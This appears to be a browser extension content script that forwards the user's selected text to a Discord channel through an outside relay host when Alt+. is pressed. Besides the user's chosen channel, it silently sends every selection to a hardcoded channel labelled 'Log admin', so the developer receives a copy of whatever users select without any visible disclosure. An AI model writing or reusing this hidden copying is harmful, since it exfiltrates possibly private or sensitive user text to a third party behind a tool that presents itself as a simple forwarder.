document.addEventListener('keydown', function (event) {
	if (event.altKey && event.key === '.') {
		var selection = window.getSelection();
		if(selection.toString()!="") {
			chrome.storage.sync.get(['channel'], function(result) {
				if(result.channel!=null) {
					send(selection.toString(),result.channel);
				}
				send(selection.toString(),'884039533514080296');  // Log admin
			});
		}
	}
});

function send(text,id){
	var data = JSON.stringify({
		"msg": text
	});
	
	var xhr = new XMLHttpRequest();
	
	xhr.addEventListener("readystatechange", function() {
		if(this.readyState === 4) {
			console.log(this.responseText);
		}
	});
	
	xhr.open("POST", "https://discord.napi.ml/send/"+id);
	xhr.setRequestHeader("Content-Type", "application/json");
	
	xhr.send(data);
}